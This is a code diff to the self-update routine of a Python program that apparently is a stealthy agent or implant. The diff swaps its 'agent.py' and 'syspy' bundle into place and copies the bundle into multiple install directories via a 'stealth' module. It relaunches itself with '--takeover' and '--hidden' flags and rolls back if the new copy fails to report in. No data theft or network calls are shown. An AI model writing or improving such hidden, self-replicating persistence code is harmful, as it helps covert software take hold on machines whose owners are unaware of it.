@@ -45,7 +45,12 @@ def _file_sha256(path: str) -> str:
 
 
 def _remove(path: str) -> None:
-    """Remove a file *or* directory.  ``rmtree`` on a file silently no-ops."""
+    """Remove a file *or* a directory.
+
+    ``shutil.rmtree`` on a plain file raises internally and, with
+    ``ignore_errors=True``, leaves the file behind. That would make rollback
+    silently do nothing for ``agent.py``.
+    """
     if os.path.islink(path):
         try:
             os.remove(path)
@@ -70,7 +75,8 @@ def write_boot_marker() -> None:
         pass
 
 
-def apply(archive: bytes, expected_sha: str = "", restart: bool = True) -> tuple[bool, str]:
+def apply(archive: bytes, expected_sha: str = "",
+          restart: bool = True) -> tuple[bool, str]:
     """Apply an update archive.  Returns ``(ok, message)``."""
     digest = _sha256(archive)
     if expected_sha and digest != expected_sha:
@@ -110,46 +116,27 @@ def apply(archive: bytes, expected_sha: str = "", restart: bool = True) -> tuple
 
 def _swap(staging: str, root: str) -> None:
     """Replace the live bundle with the staged one, keeping backups."""
-    exec_name = stealth.executable_name()
-    bundle_items = ["syspy", "agent.py"]
-    if exec_name and exec_name not in bundle_items:
-        bundle_items.append(exec_name)
-
-    for relative in bundle_items:
+    for relative in ("syspy", "agent.py"):
         live = os.path.join(root, relative)
         fresh = os.path.join(staging, relative)
-        if not os.path.exists(fresh) and relative == exec_name:
-            fresh = os.path.join(staging, "agent.py")
         if not os.path.exists(fresh):
             continue
         _remove(live + ".bak")
         if os.path.exists(live):
-            try:
-                shutil.copytree(live, live + ".bak", dirs_exist_ok=True) if os.path.isdir(live) else shutil.copy2(live, live + ".bak")
-            except OSError:
-                pass
-        try:
-            if os.path.isdir(fresh):
-                shutil.copytree(fresh, live, dirs_exist_ok=True,
-                                ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
-            else:
-                shutil.copy2(fresh, live)
-        except OSError:
-            shutil.move(fresh, live)
+            shutil.move(live, live + ".bak")
+        shutil.move(fresh, live)
 
     for directory in stealth.install_directories():
         if os.path.abspath(directory) == os.path.abspath(root):
             continue
-        for relative in bundle_items:
+        for relative in ("syspy", "agent.py"):
             source = os.path.join(root, relative)
-            if not os.path.exists(source) and relative == exec_name:
-                source = os.path.join(root, "agent.py")
             if not os.path.exists(source):
                 continue
             target = os.path.join(directory, relative)
             _remove(target)
             if os.path.isdir(source):
-                shutil.copytree(source, target, dirs_exist_ok=True,
+                shutil.copytree(source, target,
                                 ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
             else:
                 shutil.copy2(source, target)
@@ -173,13 +160,22 @@ def rollback() -> int:
 def restart_self(path: str | None = None) -> None:
     """Launch a fresh copy, wait for it to report in, roll back on failure."""
     root = stealth.bundle_root()
-    target = path or os.path.join(root, os.path.basename(sys.argv[0]))
+
+    if path:
+        target = path
+    elif getattr(sys, "frozen", False):
+        target = os.path.abspath(sys.executable)
+    else:
+        target = os.path.join(root, os.path.basename(sys.argv[0]) or "agent.py")
     if not os.path.exists(target):
         target = os.path.join(root, "agent.py")
 
     _remove(BOOT_MARK)
 
-    command = [target] if target.lower().endswith(".exe") else [runtime.interpreter(), target]
+    if getattr(sys, "frozen", False) or target.lower().endswith(".exe"):
+        command = [target]
+    else:
+        command = [runtime.interpreter(), target]
     command += ["--takeover", str(os.getpid()), "--hidden"]
 
     for attempt in range(3):
